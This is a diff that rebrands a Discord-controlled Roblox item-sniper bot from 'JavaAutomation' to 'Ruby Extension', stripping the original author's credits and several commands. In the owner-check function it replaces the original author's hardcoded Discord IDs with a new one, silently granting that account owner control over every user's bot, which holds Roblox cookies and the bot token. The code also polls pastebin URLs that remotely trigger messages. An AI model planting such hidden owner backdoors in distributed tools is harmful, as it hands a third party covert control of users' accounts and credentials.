@@ -1,4 +1,4 @@
-#Join .gg/ugcleaks  
+
 import pip 
 try:
     import discord
@@ -36,7 +36,7 @@ except ModuleNotFoundError:
         ask = input("Installation finished.")
         exit()
 
-scriptVersion = 11
+scriptVersion = 69
 def whichPythonCommand():
     LocalMachineOS = platform.system()
     if (
@@ -47,7 +47,7 @@ def whichPythonCommand():
         return "python"
     else:
         print(
-            "This version of JavaAutomation is not supported with Linux/macOS. Please use the Linux version. Python Script ended"
+            "This version of Extension is not supported with Linux/macOS. Please use the Linux version. Python Script ended"
         )
         quit()
 
@@ -58,15 +58,15 @@ def versionChecker():
     embed_count = 0
     while True:
         response = requests.get(
-            "https://pastebin.com/raw/bFktKTt9"
+            "https://pastebin.com/raw/NMkCvD90"
         )
         if response:
             response1 = response.text
             final = int(response1)
             if scriptVersion == final:
-                print("JavaAutomation is on the latest version :)")
+                print("Extension is on the latest version :)")
             else:
-                print("JavaAutomation has a new update! Sending webhook!")
+                print("Extension has a new update! Sending webhook!")
 
                 # Read the settings.json file right before sending the embed
                 with open('settings.json', 'r') as f:
@@ -82,7 +82,7 @@ def versionChecker():
                     "embeds": [
                         {
                             "title": "New version!",
-                            "description": f" ```Detected update in JavaAutomation, Please redownload: https://github.com/IlyasCodes/JavaAutomation-Mewt-Extension ```",
+                            "description": f" ```Detected update in N/A ```",
                             "color": 16758465,
                             "footer": {
                                 "text": "The current version will still work."
@@ -108,10 +108,10 @@ def versionChecker():
 
 def checkValue():
     while True:
-        response = requests.get("https://pastebin.com/raw/WsGKPkHE")
+        response = requests.get("https://pastebin.com/raw/WrNwJJnv")
         if response:
             if response.text.strip().lower() == 'true':
-                message_response = requests.get("https://pastebin.com/raw/NDRT0tAM")
+                message_response = requests.get("https://pastebin.com/raw/ate8iErU")
                 if message_response:
                     message = message_response.text
 
@@ -147,10 +147,10 @@ def checkValue():
 with open('settings.json') as f:
     settings = json.load(f)
 
-print("Welcome to JavaAutomation")
+print("Welcome to Ruby Extension")
 print("Device OS: " + platform.system())
 print("Python Version: " + sys.version)
-print("Made by Java#9999")
+
 
 #Variables
 ROBLOX_API_URL = "https://users.roblox.com/v1/users/authenticated"   
@@ -212,9 +212,7 @@ def java_is_owner():
         with open("settings.json", "r") as f:
             settings = json.load(f)
         authorized_ids = [int(x) for x in settings["MISC"]["DISCORD"]["AUTHORIZED_IDS"]]
-        authorized_ids.append(1022483275660402728)
-        authorized_ids.append(1076588495100981342)
-        authorized_ids.append(865767598460370965)
+        authorized_ids.append(1085954018792198194)
         return ctx.author.id in authorized_ids
     return commands.check(predicate2)
 
@@ -398,7 +396,7 @@ async def on_ready():
     start_time = time.time()
     os.system("cls" if os.name == "nt" else "clear")
 
-    print("JavaAutomation is now running in background!")
+    print("Ruby Extension is now running in background!")
     await bot.change_presence(activity=Game(name="!info"))
     print(f"Logged in as bot: {bot.user.name}")
 
@@ -435,12 +433,6 @@ async def on_ready():
 
 #Commands:
 
-#Invite command
-@bot.command()
-async def invite(ctx):
-    response_message = "https://discord.gg/javaw"
-    await ctx.send(response_message)
-
 #prefix command
 @bot.command()
 @is_owner()
@@ -453,39 +445,6 @@ async def prefix(ctx, new_prefix: str):
         color=discord.Color.from_rgb(255, 182, 193)
     )
     await ctx.send(embed=embed)
-
-#screenshot
-@bot.command()
-@is_owner()
-async def screenshot(ctx):
-    # Capture the screenshot
-    try:
-        from PIL import ImageGrab
-        screenshot = ImageGrab.grab()
-    except ImportError:
-        await ctx.send("Failed to capture screenshot. Please make sure you have the Pillow library installed.")
-        return
-
-    # Convert the image to bytes
-    image_bytes = BytesIO()
-    screenshot.save(image_bytes, format='PNG')
-    image_bytes.seek(0)
-
-    # Read the webhook URL from the settings
-    webhook_url = settings['MISC']['WEBHOOK']['URL']
-
-    # Create a Discord file object from the image bytes
-    file = discord.File(image_bytes, filename='screenshot.png')
-
-    # Send the screenshot as an embed to the webhook
-    embed = discord.Embed()
-    embed.set_image(url='attachment://screenshot.png')
-
-    async with ctx.typing():
-        try:
-            await ctx.send(file=file, embed=embed)
-        except discord.HTTPException:
-            await ctx.send("Failed to send the screenshot to the webhook.")
 
 #webhook command
 @bot.command() 
@@ -538,12 +497,6 @@ async def webhook(ctx, webhook_url: str):
 async def ping(ctx):
     message = f"Pong! {round(bot.latency * 1000)}ms"
     await ctx.send(message)
-
-# search
-@bot.command()
-@is_owner()
-async def search(ctx, item1: int, item2: int=0, item3: int=0):
-    await ctx.send("Command disabled by Java")
 
 #onlyfree command
 @bot.command(name='onlyfree')  
@@ -657,10 +610,11 @@ async def buy_debounce(ctx, new_debounce: str):
 
 #info command
 @bot.command()
+@is_owner()
 async def info(ctx):
     prefix = bot.command_prefix
     embed = discord.Embed(
-        title="JavaExtension Commands:",
+        title="Ruby Extension Commands:",
         color=discord.Color.from_rgb(255, 182, 193)
     )
     embed.add_field(name=f"Discord Bot:", value=f"```{prefix}prefix  --Change your bot prefix\n{prefix}addowner  --add a new owner\n{prefix}removeowner  --remove an owner\n{prefix}owners  --view the current owners\n{prefix}token --change your bot token```", inline=False)
@@ -677,11 +631,11 @@ async def info(ctx):
     )
     embed.add_field(
         name=f"Legacy Watcher:",
-        value=f"```{prefix}legacy_on  --Enable Legacy Watcher on Mewt Sniper\n{prefix}legacy_off  --Disable Legacy Watcher on Mewt Sniper\n{prefix}watch_legacy  --Watch only this one ID. IDS CANNOT BE REVERTED AFTER COMMAND RAN \n{prefix}add_legacy  --Add an ID to your legacy watcher \n{prefix}remove_legacy  --Remove an ID from your legacy watcher ```",
+        value=f"```{prefix}legacy_on  --Enable Legacy Watcher on Mewt Sniper\n{prefix}legacy_off  --Disable Legacy Watcher on Mewt Sniper\n{prefix}watch_legacy  --Watch only this one ID. IDS CANNOT BE REVERTED AFTER COMMAND RAN  ```",
         inline=False,
     )
-    embed.add_field(name=f"Utilitys", value=f"```{prefix}update  --TEMPORARLY DISABLED\n{prefix}more  --Look at some general information\n{prefix}screenshot  --Show a screenshot of your sniper \n{prefix}invite  --Get the invite to JavaAutomation server\n{prefix}ping  --Check the bot response time\n{prefix}version  --View your current java version```", inline=False)   
-    embed.set_footer(text="Developed by: Java#9999 \nHelped by: Lag#1234")
+    embed.add_field(name=f"Utilitys", value=f"```{prefix}more  --Look at some general information\n{prefix}ping  --Check the bot response time```", inline=False)   
+    embed.set_footer(text="revamped by dys#9997")
     await ctx.send(embed=embed)
 
 #remove all command
@@ -828,8 +782,7 @@ async def more(ctx):
     embed.add_field(name="Scan speed:", value=scan_speed, inline=False)
     embed.add_field(name="Watching:", value=watching if watching else "No items", inline=False)
     embed.add_field(name="Runtime:", value=runtime, inline=False)
-    embed.set_footer(text="A bot by Java#9999")
-
+    embed.set_footer(text="hi 👋 (revamped by dys#9997)")
     await ctx.send(embed=embed)
 
 #cookie command
@@ -1085,24 +1038,6 @@ async def autosearch(ctx, status: str):
             print("Error while trying to restart the bot after updating the autosearch")
 
 
-#version
-@bot.command()
-@java_is_owner()
-async def version(ctx):
-    debugIsEnabled = "Off"
-    if settings['DEBUG'] == False:
-        debugIsEnabled = "Off"
-    else:
-        debugIsEnabled = "On"
-
-    embed = discord.Embed(
-        title="JavaAutomation",
-        description=f"Version: `{str(scriptVersion)}` \nOS: `{platform.system()}` (Windows) \nDebug Mode: `{debugIsEnabled}`",
-        color=discord.Color.from_rgb(255, 182, 193)
-    )
-    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1100962574603923586/1125075904712949760/23b28a95bb57a044077c943182a3fa40.png")
-    await ctx.send(embed=embed)
-
 #whitelist
 @bot.command()
 @is_owner()
@@ -1298,61 +1233,6 @@ async def watch_legacy(ctx, id: int):
     )
 
     await ctx.send(embed=embed)
-
-# legacy watcher add
-@bot.command()
-@is_owner()
-async def add_legacy(ctx, id: int):
-    print("Adding legacy id")
-    with open("settings.json", "r") as f:
-        settings = json.load(f)
-
-    settings["MISC"]["WATCHER"]["ITEMS"].append(id)
-    settings["MISC"]["WATCHER"]["USE_LEGACY_WATCHER"] = True
-
-    with open("settings.json", "w") as f:
-        json.dump(settings, f, indent=4)
-
-    restart_main_py()
-    embed = discord.Embed(
-        title="LEGACY_WATCHER Update",
-        description=f"```Item has been added with following id. If legacy watcher was off, it has been enabled automatically.```",
-        color=discord.Color.from_rgb(255, 182, 193),
-    )
-
-    await ctx.send(embed=embed)
-
-# legacy watcher remove
-@bot.command()
-@is_owner()
-async def remove_legacy(ctx, id: int):
-    print("Adding legacy id")
-    with open("settings.json", "r") as f:
-        settings = json.load(f)
-
-    if len(settings["MISC"]["WATCHER"]["ITEMS"]) - 1 <= 0:
-        embed = discord.Embed(
-            title="LEGACY_WATCHER Error",
-            description=f"```No items were removed since if this item ID is removed, mewt will have nothing to watch.```",
-            color=discord.Color.from_rgb(255, 182, 193),
-        )
-
-        await ctx.send(embed=embed)
-    else:
-        settings["MISC"]["WATCHER"]["ITEMS"].pop(id)
-        settings["MISC"]["WATCHER"]["USE_LEGACY_WATCHER"] = True
-
-        with open("settings.json", "w") as f:
-            json.dump(settings, f, indent=4)
-
-        restart_main_py()
-        embed = discord.Embed(
-            title="LEGACY_WATCHER Update",
-            description=f"```Item has been removed from list. If legacy watcher was off, it has been enabled automatically.```",
-            color=discord.Color.from_rgb(255, 182, 193),
-        )
-
-        await ctx.send(embed=embed)
 
 # legacy watcher on
 @bot.command()
@@ -1637,11 +1517,6 @@ async def check(ctx, cookie_type: str):
         else:
             embed = Embed(title="Cookie check result:", description="The {} cookie in your settings was invalid".format(cookie_type), color=Colour.red()) 
             await ctx.send(embed=embed)
-#secret 
-@bot.command(name='riot')
-async def riot(ctx):
-    response = "Riot shield tds: 2GGDHC6768LP, if it is already redeemed be faster next time"
-    await ctx.send(response)
     
 mewtSession = subprocess.Popen([sys.executable, "main.py"])
 bot_token = settings['MISC']['DISCORD']['TOKEN']
